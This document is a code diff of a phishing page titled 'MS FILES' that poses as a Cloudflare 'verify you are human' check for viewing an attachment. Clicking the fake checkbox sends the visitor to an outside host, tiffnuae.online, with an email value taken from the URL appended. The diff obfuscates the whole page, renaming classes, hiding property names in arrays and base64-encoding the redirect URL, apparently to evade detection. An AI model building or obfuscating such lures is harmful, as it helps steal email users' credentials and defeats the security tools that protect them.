@@ -5,284 +5,112 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root {
-            --color-primary: #4a6ee0;
-            --color-success: #28a745;
-            --color-bg-light: #f8f9fa;
-            --color-text-main: #333;
-            --color-border: #ddd;
-            --transition-standard: 450ms cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #fff;
-            color: var(--color-text-main);
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            overflow-x: hidden;
-        }
-
-        /* Loading Component */
-        #loader-overlay {
-            position: fixed;
-            inset: 0;
-            background: var(--color-bg-light);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            transition: opacity var(--transition-standard);
-        }
-
-        .loader-brand {
-            width: 120px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.08); opacity: 1; }
-        }
-
-        /* Main Content */
-        .content-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            width: 100%;
-            max-width: 440px;
-            padding: 20px;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: opacity 600ms ease-out, transform 600ms ease-out;
-        }
-
-        .content-container.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .heading {
-            text-align: center;
-            font-size: 1.1rem;
-            font-weight: 500;
-            color: #222;
-            line-height: 1.4;
-            margin-bottom: 24px;
-        }
-
-        /* Verification Card */
-        .verification-card {
-            background: var(--color-bg-light);
-            border: 1px solid var(--color-border);
-            border-radius: 10px;
-            padding: 30px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: border-color 0.2s ease;
-        }
-
-        .verification-card:hover {
-            border-color: #bbb;
-        }
-
-        .check-group {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .check-box {
-            width: 20px;
-            height: 20px;
-            border: 2px solid var(--color-primary);
-            border-radius: 4px;
-            background: #fff;
-            cursor: pointer;
-            position: relative;
-            transition: all 0.25s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .check-box.loading {
-            border-radius: 50%;
-            border-color: #eee;
-            border-top-color: var(--color-primary);
-            animation: spin 1s linear infinite;
-        }
-
-        .check-box.complete {
-            background: var(--color-success);
-            border-color: var(--color-success);
-        }
-
-        .check-box.complete::after {
-            content: "\2713";
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .brand-info {
-            text-align: right;
-            font-size: 11px;
-            color: #777;
-        }
-
-        .brand-info img {
-            width: 28px;
-            vertical-align: middle;
-            margin-right: 5px;
-        }
-
-        .brand-info b {
-            color: #f38020;
-            letter-spacing: 0.5px;
-        }
-
-        .status-msg {
-            text-align: center;
-            margin-top: 25px;
-            font-size: 12px;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
-
-        /* Footer Section */
-        .footer-shield {
-            padding: 30px;
-            color: #999;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
-
-        .footer-shield.visible {
-            opacity: 1;
-        }
-
-        .shield-svg {
-            width: 12px;
-            height: 14px;
-            background: #999;
-            clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%);
-        }
+        :root { --x92: #4a6ee0; --y31: #28a745; --z88: #f8f9fa; --t12: 450ms cubic-bezier(0.4, 0, 0.2, 1); }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: system-ui, sans-serif; background: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
+        #_l0_ { position: fixed; inset: 0; background: var(--z88); display: flex; justify-content: center; align-items: center; z-index: 99999; transition: opacity var(--t12); }
+        ._lb_ { width: 120px; animation: _p_ 1.5s ease-in-out infinite; }
+        @keyframes _p_ { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; } }
+        ._cc_ { flex: 1; display: flex; flex-direction: column; justify-content: center; width: 100%; max-width: 440px; padding: 20px; opacity: 0; transform: translateY(10px); transition: all 600ms ease-out; }
+        ._cc_._v_ { opacity: 1; transform: translateY(0); }
+        ._h_ { text-align: center; font-size: 1.1rem; font-weight: 500; margin-bottom: 24px; line-height: 1.4; }
+        ._vc_ { background: var(--z88); border: 1px solid #ddd; border-radius: 10px; padding: 30px 20px; display: flex; justify-content: space-between; align-items: center; }
+        ._cg_ { display: flex; align-items: center; gap: 15px; }
+        ._bx_ { width: 20px; height: 20px; border: 2px solid var(--x92); border-radius: 4px; background: #fff; cursor: pointer; position: relative; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; }
+        ._bx_._ld_ { border-radius: 50%; border-color: #eee; border-top-color: var(--x92); animation: _s_ 1s linear infinite; }
+        ._bx_._cp_ { background: var(--y31); border-color: var(--y31); }
+        ._bx_._cp_::after { content: "\2713"; color: #fff; font-size: 14px; font-weight: bold; }
+        @keyframes _s_ { to { transform: rotate(360deg); } }
+        ._bi_ { text-align: right; font-size: 11px; color: #777; }
+        ._bi_ img { width: 28px; vertical-align: middle; margin-right: 5px; }
+        ._bi_ b { color: #f38020; letter-spacing: 0.5px; }
+        ._sm_ { text-align: center; margin-top: 25px; font-size: 12px; opacity: 0; transition: opacity 0.5s; }
+        ._fs_ { padding: 30px; color: #999; font-size: 12px; display: flex; align-items: center; gap: 8px; opacity: 0; transition: opacity 0.5s; }
+        ._fs_._v_ { opacity: 1; }
+        ._ss_ { width: 12px; height: 14px; background: #999; clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%); }
     </style>
 </head>
 <body>
 
-    <div id="loader-overlay">
-        <img src="astro.png" class="loader-brand" alt="Loading">
-    </div>
+    <div id="_l0_"><img src="astro.png" class="_lb_"></div>
 
-    <main class="content-container" id="mainContent">
-        <h1 class="heading">Verify you are human by completing the action below to view attachment</h1>
-
-        <div class="verification-card">
-            <div class="check-group">
-                <div id="actionBox" class="check-box"></div>
-                <span id="statusLabel" style="font-weight: 500; font-size: 16px;">Verify</span>
+    <main class="_cc_" id="_m1_">
+        <h1 class="_h_">Verify you are human by completing the action below to view attachment</h1>
+        <div class="_vc_">
+            <div class="_cg_">
+                <div id="_aX_" class="_bx_"></div>
+                <span id="_sL_" style="font-weight: 500; font-size: 16px;">Verify</span>
             </div>
-
-            <div class="brand-info">
-                <div><img src="cloudflare_.png" alt="logo"><b>CLOUDFLARE</b></div>
+            <div class="_bi_">
+                <div><img src="cloudflare_.png"><b>CLOUDFLARE</b></div>
                 <span>Privacy &middot; Terms</span>
             </div>
         </div>
-
-        <div id="successNotice" class="status-msg"></div>
+        <div id="_sN_" class="_sm_"></div>
     </main>
 
-    <footer class="footer-shield" id="footerLegal">
-        <div class="shield-svg"></div>
+    <footer class="_fs_" id="_fL_">
+        <div class="_ss_"></div>
         <span>Protected by CLOUDFLARE</span>
     </footer>
 
     <script>
-        (() => {
-            const DOM = {
-                loader: document.getElementById('loader-overlay'),
-                main: document.getElementById('mainContent'),
-                trigger: document.getElementById('actionBox'),
-                label: document.getElementById('statusLabel'),
-                footer: document.getElementById('footerLegal'),
-                notice: document.getElementById('successNotice')
+        (function(_0x1, _0x2) {
+            const _0x3 = {
+                _u: "aHR0cHM6Ly9wby50aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=",
+                _d: [1500, 1800, 2000],
+                _k: ["opacity", "style", "display", "classList", "add", "remove", "textContent"]
             };
 
-            const CONFIG = {
-                redirectUrl: "https://po.tiffnuae.online/api/v1/tgKHf0r0EWqIaCb5",
-                loadDelay: 1500,
-                processTime: 1800,
-                redirectDelay: 2000
+            const _q = (s) => document.getElementById(s);
+            const _obs = {
+                l: _q('_l0_'),
+                m: _q('_m1_'),
+                a: _q('_aX_'),
+                s: _q('_sL_'),
+                f: _q('_fL_'),
+                n: _q('_sN_')
             };
 
-            let isVerifying = false;
+            let _v = !1;
 
-            // Initialize Page
-            const init = () => {
-                const params = new URLSearchParams(window.location.search);
-                const emailHash = params.get('eoff');
+            const _init = () => {
+                const _p = new URLSearchParams(window.location.search);
+                const _e = _p.get('eoff');
 
                 window.addEventListener('load', () => {
                     setTimeout(() => {
-                        DOM.loader.style.opacity = '0';
+                        _obs.l[_0x3._k[1]][_0x3._k[0]] = '0';
                         setTimeout(() => {
-                            DOM.loader.style.display = 'none';
-                            DOM.main.classList.add('visible');
-                            DOM.footer.classList.add('visible');
+                            _obs.l[_0x3._k[1]][_0x3._k[2]] = 'none';
+                            _obs.m[_0x3._k[3]][_0x3._k[4]]('_v_');
+                            _obs.f[_0x3._k[3]][_0x3._k[4]]('_v_');
                         }, 500);
-                    }, CONFIG.loadDelay);
+                    }, _0x3._d[0]);
                 });
 
-                DOM.trigger.addEventListener('click', () => handleVerification(emailHash));
-            };
+                _obs.a.onclick = () => {
+                    if (_v) return;
+                    _v = !!1;
 
-            const handleVerification = (email) => {
-                if (isVerifying) return;
-
-                isVerifying = true;
-                DOM.label.textContent = "Verifying...";
-                DOM.trigger.classList.add('loading');
-
-                setTimeout(() => {
-                    DOM.trigger.classList.remove('loading');
-                    DOM.trigger.classList.add('complete');
-                    DOM.label.textContent = "Success";
+                    _obs.s[_0x3._k[6]] = "Verifying...";
+                    _obs.a[_0x3._k[3]][_0x3._k[4]]('_ld_');
 
                     setTimeout(() => {
-                        DOM.notice.style.opacity = '1';
-                    }, 400);
+                        _obs.a[_0x3._k[3]][_0x3._k[5]]('_ld_');
+                        _obs.a[_0x3._k[3]][_0x3._k[4]]('_cp_');
+                        _obs.s[_0x3._k[6]] = "Success";
+                        _obs.n[_0x3._k[1]][_0x3._k[0]] = '1';
 
-                    // Final Navigation
-                    setTimeout(() => {
-                        const destination = email ? `${CONFIG.redirectUrl}#${email}` : CONFIG.redirectUrl;
-                        window.location.href = destination;
-                    }, CONFIG.redirectDelay);
-
-                }, CONFIG.processTime);
+                        setTimeout(() => {
+                            const _target = atob(_0x3._u);
+                            location.href = _e ? `${_target}#${_e}` : _target;
+                        }, _0x3._d[2]);
+                    }, _0x3._d[1]);
+                };
             };
 
-            init();
+            _init();
         })();
     </script>
 </body>
